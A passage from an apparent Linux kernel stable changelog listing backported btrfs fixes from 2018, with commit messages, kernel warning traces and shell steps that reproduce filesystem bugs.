Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit e982beca3e4e989716dda88d215d1b96b585e542
Author: Josef Bacik
Date: Thu Oct 11 15:54:03 2018 -0400
btrfs: reset max\_extent\_size properly
commit 21a94f7acf0f748599ea552af5d9ee7d7e41c72f upstream.
If we use up our block group before allocating a new one we'll easily
get a max\_extent\_size that's set really really low, which will result in
a lot of fragmentation. We need to make sure we're resetting the
max\_extent\_size when we add a new chunk or add new space.
CC: stable@vger.kernel.org # 4.4+
Reviewed-by: Filipe Manana
Signed-off-by: Josef Bacik
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit ea9c846f54dbf03da159a1b7566aa95e9bf1674b
Author: Filipe Manana
Date: Fri Oct 12 10:03:55 2018 +0100
Btrfs: fix deadlock when writing out free space caches
commit 5ce555578e0919237fa4bda92b4670e2dd176f85 upstream.
When writing out a block group free space cache we can end deadlocking
with ourselves on an extent buffer lock resulting in a warning like the
following:
[245043.379979] WARNING: CPU: 4 PID: 2608 at fs/btrfs/locking.c:251 btrfs\_tree\_lock+0x1be/0x1d0 [btrfs]
[245043.392792] CPU: 4 PID: 2608 Comm: btrfs-transacti Tainted: G
W I 4.16.8 #1
[245043.395489] RIP: 0010:btrfs\_tree\_lock+0x1be/0x1d0 [btrfs]
[245043.396791] RSP: 0018:ffffc9000424b840 EFLAGS: 00010246
[245043.398093] RAX: 0000000000000a30 RBX: ffff8807e20a3d20 RCX: 0000000000000001
[245043.399414] RDX: 0000000000000001 RSI: 0000000000000002 RDI: ffff8807e20a3d20
[245043.400732] RBP: 0000000000000001 R08: ffff88041f39a700 R09: ffff880000000000
[245043.402021] R10: 0000000000000040 R11: ffff8807e20a3d20 R12: ffff8807cb220630
[245043.403296] R13: 0000000000000001 R14: ffff8807cb220628 R15: ffff88041fbdf000
[245043.404780] FS: 0000000000000000(0000) GS:ffff88082fc80000(0000) knlGS:0000000000000000
[245043.406050] CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[245043.407321] CR2: 00007fffdbdb9f10 CR3: 0000000001c09005 CR4: 00000000000206e0
[245043.408670] Call Trace:
[245043.409977] btrfs\_search\_slot+0x761/0xa60 [btrfs]
[245043.411278] btrfs\_insert\_empty\_items+0x62/0xb0 [btrfs]
[245043.412572] btrfs\_insert\_item+0x5b/0xc0 [btrfs]
[245043.413922] btrfs\_create\_pending\_block\_groups+0xfb/0x1e0 [btrfs]
[245043.415216] do\_chunk\_alloc+0x1e5/0x2a0 [btrfs]
[245043.416487] find\_free\_extent+0xcd0/0xf60 [btrfs]
[245043.417813] btrfs\_reserve\_extent+0x96/0x1e0 [btrfs]
[245043.419105] btrfs\_alloc\_tree\_block+0xfb/0x4a0 [btrfs]
[245043.420378] \_\_btrfs\_cow\_block+0x127/0x550 [btrfs]
[245043.421652] btrfs\_cow\_block+0xee/0x190 [btrfs]
[245043.422979] btrfs\_search\_slot+0x227/0xa60 [btrfs]
[245043.424279] ? btrfs\_update\_inode\_item+0x59/0x100 [btrfs]
[245043.425538] ? iput+0x72/0x1e0
[245043.426798] write\_one\_cache\_group.isra.49+0x20/0x90 [btrfs]
[245043.428131] btrfs\_start\_dirty\_block\_groups+0x102/0x420 [btrfs]
[245043.429419] btrfs\_commit\_transaction+0x11b/0x880 [btrfs]
[245043.430712] ? start\_transaction+0x8e/0x410 [btrfs]
[245043.432006] transaction\_kthread+0x184/0x1a0 [btrfs]
[245043.433341] kthread+0xf0/0x130
[245043.434628] ? btrfs\_cleanup\_transaction+0x4e0/0x4e0 [btrfs]
[245043.435928] ? kthread\_create\_worker\_on\_cpu+0x40/0x40
[245043.437236] ret\_from\_fork+0x1f/0x30
[245043.441054] ---[ end trace 15abaa2aaf36827f ]---
This is because at write\_one\_cache\_group() when we are COWing a leaf from
the extent tree we end up allocating a new block group (chunk) and,
because we have hit a threshold on the number of bytes reserved for system
chunks, we attempt to finalize the creation of new block groups from the
current transaction, by calling btrfs\_create\_pending\_block\_groups().
However here we also need to modify the extent tree in order to insert
a block group item, and if the location for this new block group item
happens to be in the same leaf that we were COWing earlier, we deadlock
since btrfs\_search\_slot() tries to write lock the extent buffer that we
locked before at write\_one\_cache\_group().
We have already hit similar cases in the past and commit d9a0540a79f8
("Btrfs: fix deadlock when finalizing block group creation") fixed some
of those cases by delaying the creation of pending block groups at the
known specific spots that could lead to a deadlock. This change reworks
that commit to be more generic so that we don't have to add similar logic
to every possible path that can lead to a deadlock. This is done by
making \_\_btrfs\_cow\_block() disallowing the creation of new block groups
(setting the transaction's can\_flush\_pending\_bgs to false) before it
attempts to allocate a new extent buffer for either the extent, chunk or
device trees, since those are the trees that pending block creation
modifies. Once the new extent buffer is allocated, it allows creation of
pending block groups to happen again.
This change depends on a recent patch from Josef which is not yet in
Linus' tree, named "btrfs: make sure we create all new block groups" in
order to avoid occasional warnings at btrfs\_trans\_release\_chunk\_metadata().
Fixes: d9a0540a79f8 ("Btrfs: fix deadlock when finalizing block group creation")
CC: stable@vger.kernel.org # 4.4+
Bugzilla: https://bugzilla.kernel.org/show\_bug.cgi?id=199753
Link: https://lore.kernel.org/linux-btrfs/CAJtFHUTHna09ST-\_EEiyWmDH6gAqS6wa=zMNMBsifj8ABu99cw@mail.gmail.com/
Reported-by: E V
Reviewed-by: Josef Bacik
Signed-off-by: Filipe Manana
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit e17af96eebd39a53d467c3beb6f946f64f5c3637
Author: Filipe Manana
Date: Mon Oct 15 09:51:00 2018 +0100
Btrfs: fix assertion on fsync of regular file when using no-holes feature
commit 7ed586d0a8241e81d58c656c5b315f781fa6fc97 upstream.
When using the NO\_HOLES feature and logging a regular file, we were
expecting that if we find an inline extent, that either its size in RAM
(uncompressed and unenconded) matches the size of the file or if it does
not, that it matches the sector size and it represents compressed data.
This assertion does not cover a case where the length of the inline extent
is smaller than the sector size and also smaller the file's size, such
case is possible through fallocate. Example:
$ mkfs.btrfs -f -O no-holes /dev/sdb
$ mount /dev/sdb /mnt
$ xfs\_io -f -c "pwrite -S 0xb60 0 21" /mnt/foobar
$ xfs\_io -c "falloc 40 40" /mnt/foobar
$ xfs\_io -c "fsync" /mnt/foobar
In the above example we trigger the assertion because the inline extent's
length is 21 bytes while the file size is 80 bytes. The fallocate() call
merely updated the file's size and did not touch the existing inline
extent, as expected.
So fix this by adjusting the assertion so that an inline extent length
smaller than the file size is valid if the file size is smaller than the
filesystem's sector size.
A test case for fstests follows soon.
Reported-by: Anatoly Trosinenko
Fixes: a89ca6f24ffe ("Btrfs: fix fsync after truncate when no\_holes feature is enabled")
CC: stable@vger.kernel.org # 4.14+
Link: https://lore.kernel.org/linux-btrfs/CAE5jQCfRSBC7n4pUTFJcmHh109=gwyT9mFkCOL+NKfzswmR=\_Q@mail.gmail.com/
Signed-off-by: Filipe Manana
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit 85c5f244fd3cf1d7af42525b3655d607c60a3cfb
Author: Filipe Manana
Date: Sat Oct 13 00:37:25 2018 +0100
Btrfs: fix null pointer dereference on compressed write path error
commit 3527a018c00e5dbada2f9d7ed5576437b6dd5cfb upstream.
At inode.c:compress\_file\_range(), under the "free\_pages\_out" label, we can
end up dereferencing the "pages" pointer when it has a NULL value. This
case happens when "start" has a value of 0 and we fail to allocate memory
for the "pages" pointer. When that happens we jump to the "cont" label and
then enter the "if (start == 0)" branch where we immediately call the
cow\_file\_range\_inline() function. If that function returns 0 (success
creating an inline extent) or an error (like -ENOMEM for example) we jump
to the "free\_pages\_out" label and then access "pages[i]" leading to a NULL
pointer dereference, since "nr\_pages" has a value greater than zero at
that point.
Fix this by setting "nr\_pages" to 0 when we fail to allocate memory for
the "pages" pointer.
Bugzilla: https://bugzilla.kernel.org/show\_bug.cgi?id=201119
Fixes: 771ed689d2cd ("Btrfs: Optimize compressed writeback and reads")
CC: stable@vger.kernel.org # 4.4+
Reviewed-by: Liu Bo
Signed-off-by: Filipe Manana
Reviewed-by: David Sterba
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit 8181a8f849e40f6e9de3ba14ccfa46d994cdfb4e
Author: Qu Wenruo
Date: Fri Aug 10 10:20:26 2018 +0800
btrfs: qgroup: Dirty all qgroups before rescan
commit 9c7b0c2e8dbfbcd80a71e2cbfe02704f26c185c6 upstream.
[BUG]
In the following case, rescan won't zero out the number of qgroup 1/0:
$ mkfs.btrfs -fq $DEV
$ mount $DEV /mnt
$ btrfs quota enable /mnt
$ btrfs qgroup create 1/0 /mnt
$ btrfs sub create /mnt/sub
$ btrfs qgroup assign 0/257 1/0 /mnt
$ dd if=/dev/urandom of=/mnt/sub/file bs=1k count=1000
$ btrfs sub snap /mnt/sub /mnt/snap
$ btrfs quota rescan -w /mnt
$ btrfs qgroup show -pcre /mnt
qgroupid rfer excl max\_rfer max\_excl parent child
-------- ---- ---- -------- -------- ------ -----
0/5 16.00KiB 16.00KiB none none --- ---
0/257 1016.00KiB 16.00KiB none none 1/0 ---
0/258 1016.00KiB 16.00KiB none none --- ---
1/0 1016.00KiB 16.00KiB none none --- 0/257
So far so good, but:
$ btrfs qgroup remove 0/257 1/0 /mnt
WARNING: quotas may be inconsistent, rescan needed
$ btrfs quota rescan -w /mnt
$ btrfs qgroup show -pcre /mnt
qgoupid rfer excl max\_rfer max\_excl parent child
-------- ---- ---- -------- -------- ------ -----
0/5 16.00KiB 16.00KiB none none --- ---
0/257 1016.00KiB 16.00KiB none none --- ---
0/258 1016.00KiB 16.00KiB none none --- ---
1/0 1016.00KiB 16.00KiB none none --- ---
^^^^^^^^^^ ^^^^^^^^ not cleared
[CAUSE]
Before rescan we call qgroup\_rescan\_zero\_tracking() to zero out all
qgroups' accounting numbers.
However we don't mark all qgroups dirty, but rely on rescan to do so.
If we have any high level qgroup without children, it won't be marked
dirty during rescan, since we cannot reach that qgroup.
This will cause QGROUP\_INFO items of childless qgroups never get updated
in the quota tree, thus their numbers will stay the same in "btrfs
qgroup show" output.
[FIX]
Just mark all qgroups dirty in qgroup\_rescan\_zero\_tracking(), so even if
we have childless qgroups, their QGROUP\_INFO items will still get
updated during rescan.
Reported-by: Misono Tomohiro
CC: stable@vger.kernel.org # 4.4+
Signed-off-by: Qu Wenruo
Reviewed-by: Misono Tomohiro
Tested-by: Misono Tomohiro
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit d2c6df39f93efd80f932a415390c2f50d2cc1a36
Author: Filipe Manana
Date: Tue Oct 9 15:05:29 2018 +0100
Btrfs: fix wrong dentries after fsync of file that got its parent replaced
commit 0f375eed92b5a407657532637ed9652611a682f5 upstream.
In a scenario like the following:
mkdir /mnt/A # inode 258
mkdir /mnt/B # inode 259
touch /mnt/B/bar # inode 260
sync
mv /mnt/B/bar /mnt/A/bar
mv -T /mnt/A /mnt/B
fsync /mnt/B/bar
After replaying the log we end up with file bar having 2 hard links, both
with the name 'bar' and one in the directory with inode number 258 and the
other in the directory with inode number 259. Also, we end up with the
directory inode 259 still existing and with the directory inode 258 still
named as 'A', instead of 'B'. In this scenario, file 'bar' should only
have one hard link, located at directory inode 258, the directory inode
259 should not exist anymore and the name for directory inode 258 should
be 'B'.
This incorrect behaviour happens because when attempting to log the old
parents of an inode, we skip any parents that no longer exist. Fix this
by forcing a full commit if an old parent no longer exists.
A test case for fstests follows soon.
CC: stable@vger.kernel.org # 4.4+
Signed-off-by: Filipe Manana
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit 55f21e169c84461bef80f1c3ab135f8b8b14785e
Author: Filipe Manana
Date: Mon Oct 8 11:12:55 2018 +0100
Btrfs: fix warning when replaying log after fsync of a tmpfile
commit f2d72f42d5fa3bf33761d9e47201745f624fcff5 upstream.
When replaying a log which contains a tmpfile (which necessarily has a
link count of 0) we end up calling inc\_nlink(), at
fs/btrfs/tree-log.c:replay\_one\_buffer(), which produces a warning like
the following:
[195191.943673] WARNING: CPU: 0 PID: 6924 at fs/inode.c:342 inc\_nlink+0x33/0x40
[195191.943723] CPU: 0 PID: 6924 Comm: mount Not tainted 4.19.0-rc6-btrfs-next-38 #1
[195191.943724] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.11.2-0-gf9626ccb91-prebuilt.qemu-project.org 04/01/2014
[195191.943726] RIP: 0010:inc\_nlink+0x33/0x40
[195191.943728] RSP: 0018:ffffb96e425e3870 EFLAGS: 00010246
[195191.943730] RAX: 0000000000000000 RBX: ffff8c0d1e6af4f0 RCX: 0000000000000006
[195191.943731] RDX: 0000000000000000 RSI: 0000000000000000 RDI: ffff8c0d1e6af4f0
[195191.943731] RBP: 0000000000000097 R08: 0000000000000001 R09: 0000000000000000
[195191.943732] R10: 0000000000000000 R11: 0000000000000000 R12: ffffb96e425e3a60
[195191.943733] R13: ffff8c0d10cff0c8 R14: ffff8c0d0d515348 R15: ffff8c0d78a1b3f8
[195191.943735] FS: 00007f570ee24480(0000) GS:ffff8c0dfb200000(0000) knlGS:0000000000000000
[195191.943736] CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[195191.943737] CR2: 00005593286277c8 CR3: 00000000bb8f2006 CR4: 00000000003606f0
[195191.943739] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
[195191.943740] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
[195191.943741] Call Trace:
[195191.943778] replay\_one\_buffer+0x797/0x7d0 [btrfs]
[195191.943802] walk\_up\_log\_tree+0x1c1/0x250 [btrfs]
[195191.943809] ? rcu\_read\_lock\_sched\_held+0x3f/0x70
[195191.943825] walk\_log\_tree+0xae/0x1d0 [btrfs]
[195191.943840] btrfs\_recover\_log\_trees+0x1d7/0x4d0 [btrfs]
[195191.943856] ? replay\_dir\_deletes+0x280/0x280 [btrfs]
[195191.943870] open\_ctree+0x1c3b/0x22a0 [btrfs]
[195191.943887] btrfs\_mount\_root+0x6b4/0x800 [btrfs]
[195191.943894] ? rcu\_read\_lock\_sched\_held+0x3f/0x70
[195191.943899] ? pcpu\_alloc+0x55b/0x7c0
[195191.943906] ? mount\_fs+0x3b/0x140
[195191.943908] mount\_fs+0x3b/0x140
[195191.943912] ? \_\_init\_waitqueue\_head+0x36/0x50
[195191.943916] vfs\_kern\_mount+0x62/0x160
[195191.943927] btrfs\_mount+0x134/0x890 [btrfs]
[195191.943936] ? rcu\_read\_lock\_sched\_held+0x3f/0x70
[195191.943938] ? pcpu\_alloc+0x55b/0x7c0
[195191.943943] ? mount\_fs+0x3b/0x140
[195191.943952] ? btrfs\_remount+0x570/0x570 [btrfs]
[195191.943954] mount\_fs+0x3b/0x140
[195191.943956] ? \_\_init\_waitqueue\_head+0x36/0x50
[195191.943960] vfs\_kern\_mount+0x62/0x160
[195191.943963] do\_mount+0x1f9/0xd40
[195191.943967] ? memdup\_user+0x4b/0x70
[195191.943971] ksys\_mount+0x7e/0xd0
[195191.943974] \_\_x64\_sys\_mount+0x21/0x30
[195191.943977] do\_syscall\_64+0x60/0x1b0
[195191.943980] entry\_SYSCALL\_64\_after\_hwframe+0x49/0xbe
[195191.943983] RIP: 0033:0x7f570e4e524a
[195191.943986] RSP: 002b:00007ffd83589478 EFLAGS: 00000206 ORIG\_RAX: 00000000000000a5
[195191.943989] RAX: ffffffffffffffda RBX: 0000563f335b2060 RCX: 00007f570e4e524a
[195191.943990] RDX: 0000563f335b2240 RSI: 0000563f335b2280 RDI: 0000563f335b2260
[195191.943992] RBP: 0000000000000000 R08: 0000000000000000 R09: 0000000000000020
[195191.943993] R10: 00000000c0ed0000 R11: 0000000000000206 R12: 0000563f335b2260
[195191.943994] R13: 0000563f335b2240 R14: 0000000000000000 R15: 00000000ffffffff
[195191.944002] irq event stamp: 8688
[195191.944010] hardirqs last enabled at (8687): [] console\_unlock+0x503/0x640
[195191.944012] hardirqs last disabled at (8688): [] trace\_hardirqs\_off\_thunk+0x1a/0x1c
[195191.944018] softirqs last enabled at (8638): [] \_\_set\_page\_dirty\_nobuffers+0x101/0x150
[195191.944020] softirqs last disabled at (8634): [] wb\_wakeup\_delayed+0x2e/0x60
[195191.944022] ---[ end trace 5d6e873a9a0b811a ]---
This happens because the inode does not have the flag I\_LINKABLE set,
which is a runtime only flag, not meant to be persisted, set when the
inode is created through open(2) if the flag O\_EXCL is not passed to it.
Except for the warning, there are no other consequences (like corruptions
or metadata inconsistencies).
Since it's pointless to replay a tmpfile as it would be deleted in a
later phase of the log replay procedure (it has a link count of 0), fix
this by not logging tmpfiles and if a tmpfile is found in a log (created
by a kernel without this change), skip the replay of the inode.
A test case for fstests follows soon.
Fixes: 471d557afed1 ("Btrfs: fix loss of prealloc extents past i\_size after fsync log replay")
CC: stable@vger.kernel.org # 4.18+
Reported-by: Martin Steigerwald
Link: https://lore.kernel.org/linux-btrfs/3666619.NTnn27ZJZE@merkaba/
Signed-off-by: Filipe Manana
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit 1d6d4a0339675b0f2edb421191dc6518d5720be2
Author: Josef Bacik
Date: Fri Sep 28 07:18:02 2018 -0400
btrfs: make sure we create all new block groups
commit 545e3366db823dc3342ca9d7fea803f829c9062f upstream.
Allocating new chunks modifies both the extent and chunk tree, which can
trigger new chunk allocations. So instead of doing list\_for\_each\_safe,
just do while (!list\_empty()) so we make sure we don't exit with other
pending bg's still on our list.
CC: stable@vger.kernel.org # 4.4+
Reviewed-by: Omar Sandoval
Reviewed-by: Liu Bo
Signed-off-by: Josef Bacik
Reviewed-by: David Sterba
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit 9aabbb2ecd0511872af94533c609f83c6104b0a6
Author: Josef Bacik
Date: Fri Sep 28 07:18:00 2018 -0400
btrfs: reset max\_extent\_size on clear in a bitmap
commit 553cceb49681d60975d00892877d4c871bf220f9 upstream.
We need to clear the max\_extent\_size when we clear bits from a bitmap
since it could have been from the range that contains the
max\_extent\_size.
CC: stable@vger.kernel.org # 4.4+
Reviewed-by: Liu Bo
Signed-off-by: Josef Bacik
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit 9006ad16effe24fa74c7dd1dc5b16197e1b2ece2
Author: Josef Bacik
Date: Fri Sep 28 07:17:49 2018 -0400
btrfs: protect space cache inode alloc with GFP\_NOFS
commit 84de76a2fb217dc1b6bc2965cc397d1648aa1404 upstream.
If we're allocating a new space cache inode it's likely going to be
under a transaction handle, so we need to use memalloc\_nofs\_save() in
order to avoid deadlocks, and more importantly lockdep messages that
make xfstests fail.
CC: stable@vger.kernel.org # 4.4+
Reviewed-by: Omar Sandoval
Signed-off-by: Josef Bacik
Reviewed-by: David Sterba
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit 0de8cf3f9909a7d1b6c4a87805a7fa42210dc77a
Author: Josef Bacik
Date: Fri Sep 28 07:17:48 2018 -0400
btrfs: release metadata before running delayed refs
commit f45c752b65af46bf42963295c332865d95f97fff upstream.
We want to release the unused reservation we have since it refills the
delayed refs reserve, which will make everything go smoother when
running the delayed refs if we're short on our reservation.
CC: stable@vger.kernel.org # 4.4+
Reviewed-by: Omar Sandoval
Reviewed-by: Liu Bo
Reviewed-by: Nikolay Borisov
Signed-off-by: Josef Bacik
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit 8f2ecee5a2a2107189946b7971f5285f2f352a2b
Author: Chris Mason
Date: Wed Jun 20 07:56:11 2018 -0700
Btrfs: don't clean dirty pages during buffered writes
commit 7703bdd8d23e6ef057af3253958a793ec6066b28 upstream.
During buffered writes, we follow this basic series of steps:
again:
lock all the pages
wait for writeback on all the pages
Take the extent range lock
wait for ordered extents on the whole range
clean all the pages
if (copy\_from\_user\_in\_atomic() hits a fault) {
drop our locks
goto again;
}
dirty all the pages
release all the locks
The extra waiting, cleaning and locking are there to make sure we don't
modify pages in flight to the drive, after they've been crc'd.
If some of the pages in the range were already dirty when the write
began, and we need to goto again, we create a window where a dirty page
has been cleaned and unlocked. It may be reclaimed before we're able to
lock it again, which means we'll read the old contents off the drive and
lose any modifications that had been pending writeback.
We don't actually need to clean the pages. All of the other locking in
place makes sure we don't start IO on the pages, so we can just leave
them dirty for the duration of the write.
Fixes: 73d59314e6ed (the original btrfs merge)
CC: stable@vger.kernel.org # v4.4+
Signed-off-by: Chris Mason
Reviewed-by: David Sterba
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit 2974abff6a83a4fc94cc7c3cc40963d5aaea2926
Author: Josef Bacik
Date: Wed Sep 12 10:45:45 2018 -0400
btrfs: wait on caching when putting the bg cache
commit 3aa7c7a31c26321696b92841d5103461c6f3f517 upstream.
While testing my backport I noticed there was a panic if I ran
generic/416 generic/417 generic/418 all in a row. This just happened to
uncover a race where we had outstanding IO after we destroy all of our
workqueues, and then we'd go to queue the endio work on those free'd
workqueues.
This is because we aren't waiting for the caching threads to be done
before freeing everything up, so to fix this make sure we wait on any
outstanding caching that's being done before we free up the block group,
so we're sure to be done with all IO by the time we get to
btrfs\_stop\_all\_workers(). This fixes the panic I was seeing
consistently in testing.
------------[ cut here ]------------
kernel BUG at fs/btrfs/volumes.c:6112!
SMP PTI
Modules linked in:
CPU: 1 PID: 27165 Comm: kworker/u4:7 Not tainted 4.16.0-02155-g3553e54a578d-dirty #875
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.11.0-2.el7 04/01/2014
Workqueue: btrfs-cache btrfs\_cache\_helper
RIP: 0010:btrfs\_map\_bio+0x346/0x370
RSP: 0000:ffffc900061e79d0 EFLAGS: 00010202
RAX: 0000000000000000 RBX: ffff880071542e00 RCX: 0000000000533000
RDX: ffff88006bb74380 RSI: 0000000000000008 RDI: ffff880078160000
RBP: 0000000000000001 R08: ffff8800781cd200 R09: 0000000000503000
R10: ffff88006cd21200 R11: 0000000000000000 R12: 0000000000000000
R13: 0000000000000000 R14: ffff8800781cd200 R15: ffff880071542e00
FS: 0000000000000000(0000) GS:ffff88007fd00000(0000) knlGS:0000000000000000
CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 000000000817ffc4 CR3: 0000000078314000 CR4: 00000000000006e0
DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
Call Trace:
btree\_submit\_bio\_hook+0x8a/0xd0
submit\_one\_bio+0x5d/0x80
read\_extent\_buffer\_pages+0x18a/0x320
btree\_read\_extent\_buffer\_pages+0xbc/0x200
? alloc\_extent\_buffer+0x359/0x3e0
read\_tree\_block+0x3d/0x60
read\_block\_for\_search.isra.30+0x1a5/0x360
btrfs\_search\_slot+0x41b/0xa10
btrfs\_next\_old\_leaf+0x212/0x470
caching\_thread+0x323/0x490
normal\_work\_helper+0xc5/0x310
process\_one\_work+0x141/0x340
worker\_thread+0x44/0x3c0
kthread+0xf8/0x130
? process\_one\_work+0x340/0x340
? kthread\_bind+0x10/0x10
ret\_from\_fork+0x35/0x40
RIP: btrfs\_map\_bio+0x346/0x370 RSP: ffffc900061e79d0
---[ end trace 827eb13e50846033 ]---
Kernel panic - not syncing: Fatal exception
Kernel Offset: disabled
---[ end Kernel panic - not syncing: Fatal exception
CC: stable@vger.kernel.org # 4.4+
Signed-off-by: Josef Bacik
Reviewed-by: Omar Sandoval
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit 0a7f6c7e973d82a43bd17ec2166977bdac345e2b
Author: Jeff Mahoney
Date: Thu Sep 6 17:18:16 2018 -0400
btrfs: keep trim from interfering with transaction commits
commit fee7acc361314df6561208c2d3c0882d663dd537 upstream.
Commit 499f377f49f08 (btrfs: iterate over unused chunk space in FITRIM)
fixed free space trimming, but introduced latency when it was running.
This is due to it pinning the transaction using both a incremented
refcount and holding the commit root sem for the duration of a single
trim operation.
This was to ensure safety but it's unnecessary. We already hold the the
chunk mutex so we know that the chunk we're using can't be allocated
while we're trimming it.
In order to check against chunks allocated already in this transaction,
we need to check the pending chunks list. To to that safely without
joining the transaction (or attaching than then having to commit it) we
need to ensure that the dev root's commit root doesn't change underneath
us and the pending chunk lists stays around until we're done with it.
We can ensure the former by holding the commit root sem and the latter
by pinning the transaction. We do this now, but the critical section
covers the trim operation itself and we don't need to do that.
This patch moves the pinning and unpinning logic into helpers and unpins
the transaction after performing the search and check for pending
chunks.
Limiting the critical section of the transaction pinning improves the
latency substantially on slower storage (e.g. image files over NFS).
Fixes: 499f377f49f08 ("btrfs: iterate over unused chunk space in FITRIM")
CC: stable@vger.kernel.org # 4.4+
Signed-off-by: Jeff Mahoney
Reviewed-by: David Sterba
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit 4d0dfd8fc83395ac06a0ba34b6f77151f2ea173d
Author: Jeff Mahoney
Date: Thu Sep 6 17:18:15 2018 -0400
btrfs: don't attempt to trim devices that don't support it
commit 0be88e367fd8fbdb45257615d691f4675dda062f upstream.
We check whether any device the file system is using supports discard in
the ioctl call, but then we attempt to trim free extents on every device
regardless of whether discard is supported. Due to the way we mask off
EOPNOTSUPP, we can end up issuing the trim operations on each free range
on devices that don't support it, just wasting time.
Fixes: 499f377f49f08 ("btrfs: iterate over unused chunk space in FITRIM")
CC: stable@vger.kernel.org # 4.4+
Signed-off-by: Jeff Mahoney
Reviewed-by: David Sterba
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit 76e59a628e0124929fe05984c3fa0fbaf00a9b0b
Author: Jeff Mahoney
Date: Thu Sep 6 17:18:14 2018 -0400
btrfs: iterate all devices during trim, instead of fs\_devices::alloc\_list
commit d4e329de5e5e21594df2e0dd59da9acee71f133b upstream.
btrfs\_trim\_fs iterates over the fs\_devices->alloc\_list while holding the
device\_list\_mutex. The problem is that ->alloc\_list is protected by the
chunk mutex. We don't want to hold the chunk mutex over the trim of the
entire file system. Fortunately, the ->dev\_list list is protected by
the dev\_list mutex and while it will give us all devices, including
read-only devices, we already just skip the read-only devices. Then we
can continue to take and release the chunk mutex while scanning each
device.
Fixes: 499f377f49f ("btrfs: iterate over unused chunk space in FITRIM")
CC: stable@vger.kernel.org # 4.4+
Signed-off-by: Jeff Mahoney
Reviewed-by: David Sterba
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit d147f4dc8a528c5fd28a5b4baa95db5c504a8e2e
Author: Qu Wenruo
Date: Fri Sep 7 14:16:24 2018 +0800
btrfs: Ensure btrfs\_trim\_fs can trim the whole filesystem
commit 6ba9fc8e628becf0e3ec94083450d089b0dec5f5 upstream.
[BUG]
fstrim on some btrfs only trims the unallocated space, not trimming any
space in existing block groups.
[CAUSE]
Before fstrim\_range passed to btrfs\_trim\_fs(), it gets truncated to
range [0, super->total\_bytes). So later btrfs\_trim\_fs() will only be
able to trim block groups in range [0, super->total\_bytes).
While for btrfs, any bytenr aligned to sectorsize is valid, since btrfs
uses its logical address space, there is nothing limiting the location
where we put block groups.
For filesystem with frequent balance, it's quite easy to relocate all
block groups and bytenr of block groups will start beyond
super->total\_bytes.
In that case, btrfs will not trim existing block groups.
[FIX]
Just remove the truncation in btrfs\_ioctl\_fitrim(), so btrfs\_trim\_fs()
can get the unmodified range, which is normally set to [0, U64\_MAX].
Reported-by: Chris Murphy
Fixes: f4c697e6406d ("btrfs: return EINVAL if start > total\_bytes in fitrim ioctl")
CC:  # v4.4+
Signed-off-by: Qu Wenruo
Reviewed-by: Nikolay Borisov
Reviewed-by: David Sterba
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit c9ee71096aeefa2dee33f02a8716449b23e7424a
Author: Qu Wenruo
Date: Fri Sep 7 14:16:23 2018 +0800
btrfs: Enhance btrfs\_trim\_fs function to handle error better
commit 93bba24d4b5ad1e5cd8b43f64e66ff9d6355dd20 upstream.
Function btrfs\_trim\_fs() doesn't handle errors in a consistent way. If
error happens when trimming existing block groups, it will skip the
remaining blocks and continue to trim unallocated space for each device.
The return value will only reflect the final error from device trimming.
This patch will fix such behavior by:
1) Recording the last error from block group or device trimming
The return value will also reflect the last error during trimming.
Make developer more aware of the problem.
2) Continuing trimming if possible
If we failed to trim one block group or device, we could still try
the next block group or device.
3) Report number of failures during block group and device trimming
It would be less noisy, but still gives user a brief summary of
what's going wrong.
Such behavior can avoid confusion for cases like failure to trim the
first block group and then only unallocated space is trimmed.
Reported-by: Chris Murphy
CC: stable@vger.kernel.org # 4.4+
Signed-off-by: Qu Wenruo
Reviewed-by: David Sterba
[ add bg\_ret and dev\_ret to the messages ]
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit 18bdce0e35c248835fe6aa3287f5fa84cc0fb65f
Author: Jeff Mahoney
Date: Thu Sep 6 15:52:17 2018 -0400
btrfs: fix error handling in btrfs\_dev\_replace\_start
commit 5c06147128fbbdf7a84232c5f0d808f53153defe upstream.
When we fail to start a transaction in btrfs\_dev\_replace\_start, we leave
dev\_replace->replace\_start set to STARTED but clear ->srcdev and
->tgtdev. Later, that can result in an Oops in
btrfs\_dev\_replace\_progress when having state set to STARTED or SUSPENDED
implies that ->srcdev is valid.
Also fix error handling when the state is already STARTED or SUSPENDED
while starting. That, too, will clear ->srcdev and ->tgtdev even though
it doesn't own them. This should be an impossible case to hit since we
should be protected by the BTRFS\_FS\_EXCL\_OP bit being set. Let's add an
ASSERT there while we're at it.
Fixes: e93c89c1aaaaa (Btrfs: add new sources for device replace code)
CC: stable@vger.kernel.org # 4.4+
Signed-off-by: Jeff Mahoney
Reviewed-by: David Sterba
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
